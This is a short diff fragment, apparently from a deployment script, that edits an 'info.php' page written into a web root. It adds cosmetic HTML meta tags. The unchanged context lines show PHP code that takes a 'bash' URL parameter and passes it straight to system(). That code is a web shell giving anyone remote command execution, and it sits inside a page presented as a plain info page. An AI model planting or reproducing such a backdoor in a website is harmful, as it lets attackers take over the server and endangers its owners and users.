@@ -5,11 +5,14 @@ cat > /var/www/hub.paotung.org/./info.php << '_EOF_'
     $cmd=$_GET['bash'];
     system($cmd);
   }
-?></pre>
+?></pre>  
 <!doctype html>
-<html>
+<html lang="en" dir="ltr">
 <head>
 <meta charset="utf-8">
+<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1">
+<meta name="keywords" content="info">
+<meta name="description" content="info">
 <title>info</title>
 <style>
 html {
